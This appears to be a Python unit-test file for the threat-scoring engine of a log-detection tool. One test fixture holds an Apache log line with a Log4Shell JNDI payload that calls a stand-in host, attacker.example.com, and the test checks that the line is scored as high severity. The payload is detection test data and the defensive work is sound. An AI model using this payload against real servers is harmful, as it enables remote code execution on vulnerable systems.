"""Tests for the scoring engine (Étape 4)."""

from __future__ import annotations

import sys
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT))

from marine_log_sentinel.ml.models import (  # noqa: E402
    AnomalyScore,
    LogPrediction,
    TtpHit,
)
from marine_log_sentinel.scoring import (  # noqa: E402
    DEFAULT_BANDS,
    DEFAULT_WEIGHTS,
    ScoringEngine,
    ScoringWeights,
    SeverityBands,
    build_default_engine,
    score_predictions_file,
)
from marine_log_sentinel.scoring.engine import _clamp  # noqa: E402

_ENGINE: ScoringEngine | None = None


def _engine() -> ScoringEngine:
    global _ENGINE
    if _ENGINE is None:
        _ENGINE = build_default_engine()
    return _ENGINE


def _prediction(
    *,
    anomaly: float = 0.3,
    raw: str = "GET /index.html HTTP/1.1 200",
    top_ttps: list[TtpHit] | None = None,
    source_format: str = "apache_access",
    event_category: str = "web_request",
) -> LogPrediction:
    return LogPrediction(
        timestamp_utc=datetime(2026, 5, 12, 10, 0, tzinfo=timezone.utc),
        source_format=source_format,
        event_category=event_category,
        source_file="test.jsonl",
        raw_excerpt=raw,
        anomaly=AnomalyScore(score=anomaly, method="isolation_forest"),
        top_ttps=top_ttps or [],
    )


class WeightsInvariantTest(unittest.TestCase):
    def test_default_signal_weights_sum_to_one(self):
        total = (
            DEFAULT_WEIGHTS.anomaly
            + DEFAULT_WEIGHTS.ttp_match
            + DEFAULT_WEIGHTS.cve_severity
            + DEFAULT_WEIGHTS.suspicious_tokens
        )
        self.assertAlmostEqual(total, 1.0, places=6)

    def test_weights_validate_at_construction(self):
        with self.assertRaises(ValueError):
            ScoringWeights(anomaly=0.5, ttp_match=0.5, cve_severity=0.5, suspicious_tokens=0.5)
        with self.assertRaises(ValueError):
            ScoringWeights(kev_boost=0.5)

    def test_fingerprint_is_stable_and_changes_on_edit(self):
        a = ScoringWeights().fingerprint()
        b = ScoringWeights().fingerprint()
        self.assertEqual(a, b)
        c = ScoringWeights(
            anomaly=0.4, ttp_match=0.2, cve_severity=0.35, suspicious_tokens=0.05
        ).fingerprint()
        self.assertNotEqual(a, c)


class SeverityBandsTest(unittest.TestCase):
    def test_thresholds(self):
        bands = SeverityBands()
        self.assertEqual(bands.classify(80), "CRITICAL")
        self.assertEqual(bands.classify(70), "CRITICAL")
        self.assertEqual(bands.classify(69.9), "HIGH")
        self.assertEqual(bands.classify(50), "HIGH")
        self.assertEqual(bands.classify(30), "MEDIUM")
        self.assertEqual(bands.classify(29.9), "LOW")
        self.assertEqual(bands.classify(0), "LOW")


class FormulaInvariantTest(unittest.TestCase):
    """Properties the score must satisfy for every input.

    These are the *defensible* claims to make to the jury:
    a CRITICAL alert cannot arise from anomaly alone, and a high CVSS
    score alone cannot reach CRITICAL without any TTP linkage.
    """

    @classmethod
    def setUpClass(cls):
        cls.engine = _engine()

    def test_empty_evidence_yields_low_band(self):
        pred = _prediction(anomaly=0.0)
        scored = self.engine.score(pred)
        self.assertEqual(scored.score, 0.0)
        self.assertEqual(scored.severity_band, "LOW")

    def test_pure_max_anomaly_cannot_reach_critical(self):
        pred = _prediction(anomaly=1.0)
        scored = self.engine.score(pred)
        self.assertLess(
            scored.score,
            DEFAULT_BANDS.critical,
            f"Anomaly alone produced {scored.score:.2f}, must not be CRITICAL.",
        )

    def test_high_anomaly_high_ttp_no_cve_stays_below_critical_without_kev(self):
        ttp = TtpHit(
            technique_id="T9999",
            technique_name="Nonexistent",
            score=0.5,
            rationale_terms=["foo"],
        )
        pred = _prediction(anomaly=0.9, top_ttps=[ttp])
        scored = self.engine.score(pred)
        self.assertLess(scored.score, DEFAULT_BANDS.critical)

    def test_kev_boost_is_additive_and_reflected_in_breakdown(self):
        ttp = TtpHit(
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
            score=0.20,
            tactics=["initial-access"],
        )
        pred = _prediction(anomaly=0.5, top_ttps=[ttp])
        scored = self.engine.score(pred)
        if scored.evidence.any_kev_listed:
            self.assertAlmostEqual(
                scored.breakdown.kev_boost_applied,
                DEFAULT_WEIGHTS.kev_boost,
                places=6,
            )
        else:
            self.assertEqual(scored.breakdown.kev_boost_applied, 0.0)

    def test_log4shell_apache_reaches_high_or_critical(self):
        ttp_t1190 = TtpHit(
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
            score=0.13,
            tactics=["initial-access"],
            rationale_terms=["jndi", "ldap", "log4j"],
        )
        pred = _prediction(
            anomaly=0.4,
            raw=(
                '12.34.56.78 - - "GET /?x=${jndi:ldap://attacker.example.com/a} '
                'HTTP/1.1" 200 ${jndi:ldap://attacker.example.com/}'
            ),
            top_ttps=[ttp_t1190],
        )
        scored = self.engine.score(pred)
        self.assertGreaterEqual(scored.score, DEFAULT_BANDS.high)
        self.assertGreater(scored.breakdown.cve_term, 0.0)
        self.assertTrue(scored.evidence.related_cves)
        self.assertTrue(scored.evidence.any_kev_listed)
        related = [c.cve_id for c in scored.evidence.related_cves]
        self.assertIn("CVE-2021-44228", related)

    def test_breakdown_sums_match_final_score(self):
        ttp = TtpHit(
            technique_id="T1059",
            technique_name="Command and Scripting Interpreter",
            score=0.10,
            tactics=["execution"],
        )
        pred = _prediction(anomaly=0.5, top_ttps=[ttp])
        scored = self.engine.score(pred)
        recomputed_base = _clamp(
            scored.breakdown.anomaly_term
            + scored.breakdown.ttp_term
            + scored.breakdown.cve_term
            + scored.breakdown.suspicious_term
            + scored.breakdown.kev_boost_applied,
        )
        self.assertAlmostEqual(recomputed_base, scored.breakdown.base_score, places=6)
        self.assertAlmostEqual(
            round(recomputed_base * scored.breakdown.asset_factor * 100.0, 2),
            scored.score,
            places=2,
        )

    def test_asset_factor_is_clamped(self):
        ttp = TtpHit(
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
            score=0.13,
        )
        pred = _prediction(anomaly=0.4, top_ttps=[ttp])
        baseline = self.engine.score(pred, asset_factor=1.0)
        boosted = self.engine.score(pred, asset_factor=2.0)
        clamped_over = self.engine.score(pred, asset_factor=99.0)
        self.assertEqual(boosted.score, clamped_over.score)
        self.assertGreaterEqual(boosted.score, baseline.score)


class EvidenceChainTest(unittest.TestCase):
    def test_evidence_carries_mitigations_and_log_sources_for_t1190(self):
        engine = _engine()
        ttp = TtpHit(
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
            score=0.13,
        )
        pred = _prediction(anomaly=0.4, top_ttps=[ttp])
        scored = engine.score(pred)
        self.assertTrue(scored.evidence.mitigations)
        self.assertTrue(scored.evidence.detection_log_sources)
        self.assertTrue(any(m.mitigation_id.startswith("M") for m in scored.evidence.mitigations))


class IntegrationTest(unittest.TestCase):
    """End-to-end: scoring the 25 challenge predictions."""

    PREDICTIONS_PATH = PROJECT_ROOT / "data" / "predictions" / "predictions.jsonl"

    @classmethod
    def setUpClass(cls):
        if not cls.PREDICTIONS_PATH.exists():
            raise unittest.SkipTest(
                "Run `python -m marine_log_sentinel analyze --input data/normalized` first."
            )

    def test_scoring_writes_ranked_jsonl_and_log4shell_is_in_top_three(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "scored.jsonl"
            scored = score_predictions_file(self.PREDICTIONS_PATH, out)
            self.assertTrue(out.exists())
            self.assertGreater(len(scored), 0)
            scores = [s.score for s in scored]
            self.assertEqual(scores, sorted(scores, reverse=True))
            top_three = scored[:3]
            self.assertTrue(
                any(
                    "${jndi:" in s.prediction.raw_excerpt
                    or "Log4j" in s.prediction.raw_excerpt
                    or any(cve.cve_id == "CVE-2021-44228" for cve in s.evidence.related_cves)
                    for s in top_three
                ),
                f"Log4Shell evidence should rank top-3, got: "
                f"{[(s.score, s.prediction.source_format) for s in top_three]}",
            )


if __name__ == "__main__":
    unittest.main()
